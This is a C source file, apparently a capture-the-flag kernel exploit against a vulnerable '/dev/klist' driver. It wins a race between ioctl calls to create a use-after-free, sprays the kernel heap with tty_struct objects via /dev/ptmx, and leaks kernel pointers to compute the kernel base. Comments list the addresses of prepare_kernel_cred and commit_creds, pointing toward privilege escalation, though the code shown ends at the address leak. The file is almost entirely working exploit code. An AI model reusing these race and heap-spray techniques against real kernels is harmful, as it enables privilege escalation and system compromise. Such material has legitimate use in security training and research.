#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>

#define BUFSIZE 0x2e0
#define NUM_SPRAY 0x100

#define KERN_BASE (0xffff880000000000ULL)


int ptmx_fds[NUM_SPRAY];

void open_ptmx(int* fds) {
    for (int i=0; i<NUM_SPRAY; i++)
        fds[i] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    for (int i=0; i<0x100; i++)
        if (fds[i] < 0)
            exit(10);
}


void close_ptmx(int* fds) {
    for (int i=0; i<0x100; i++)
        close(fds[i]);
}


// / # cat /proc/kallsyms | grep prepare_kernel_cred
// ffffffff81074950 T prepare_kernel_cred
// / # cat /proc/kallsyms | grep commit_creds
// ffffffff810745f0 T commit_creds


int select_item(int fd, long idx) {
    return ioctl(fd, 0x1338, idx);
}


unsigned long args[2];
int add_item(int fd, long size, char* buf) {
    args[0] = size;
    args[1] = (unsigned long)buf;
    return ioctl(fd, 0x1337, args);
}

void remove_item(int fd) {
    ioctl(fd, 0x1338, 0);
}


int list_head(int fd, char* buf) {
    return ioctl(fd, 0x133a, buf);
}


int free_now = 0;
int alloc_now = 0;
int race_win = 0;
void *race(void *fdp) {
    char buf[2048];
    while (1) {
        while (!free_now) ;
        if (race_win)
            break;
        alloc_now = 1;
        list_head(*(int *)fdp, buf);
        alloc_now = 0;
    }
    return 0;
}

void *thread(int* fd) {
    unsigned long tmp2[BUFSIZE/8];
    while (1) {
        while (!free_now);
        if (race_win)
            break;
        alloc_now = 1;
        list_head(*fd, (char*)tmp2);
        // usleep(1);
        alloc_now = 0;
    }
    return 0;
}


int main(void) {
    int i;
    int fds[2];
    char buf[1024];
    unsigned long tmp[BUFSIZE / 8];
    char head_buf[1024];
    fds[0] = open("/dev/klist", O_RDWR);
    fds[1] = open("/dev/klist", O_RDWR);

    memset(buf, 'A', sizeof(buf));
    // This add is required, so race executed from pthread_create will not cause panic
    add_item(fds[0], BUFSIZE - 0x18, buf);

    pthread_t th;
    pthread_create(&th, NULL, race, &fds[1]);

    memset(buf, 0, sizeof(buf));
    while (1) {
        free_now = 1;
        while (!alloc_now) ;
        add_item(fds[0], BUFSIZE - 0x18, buf);
        free_now = 0;
        open_ptmx(ptmx_fds);
        list_head(fds[0], head_buf); // Use different buffer from add_item or the kernel will panic
        if (head_buf[0] == 0x1 && head_buf[1] == 0x54) {
            for (i = 0; i < 0x10; ++i) {
                printf("0x%lx\n", *((unsigned long *)head_buf + i));
            }
            race_win = 1;
            free_now = 1;
            break;
        }
        close_ptmx(ptmx_fds);
    }
    printf("Waiting to join\n");
    pthread_join(th, NULL);
    unsigned long long leaked_data = *(unsigned long long *)(head_buf + 0x10);
    unsigned long long addr_kernel = leaked_data - 0x7be91b40;
    printf("[+] Leaked data = 0x%016llx\n", leaked_data);
    printf("[+] addr_kernel = 0x%016llx\n", addr_kernel);
    unsigned long hoge;
    select_item(fds[1], 1);
    read(fds[1], &hoge, 0x8);
    printf("%lx\n", hoge);
    unsigned long long kernel_base = hoge - 0x101c9ca;
    printf("kernel_base = %lx\n", kernel_base);
    return 0;
}
// Chunk allocated via `add_item()` might be freed by `race()`
// resulting in a dangling pointer.
// Spray heap with `tty_struct`
// Did the spray succeed?
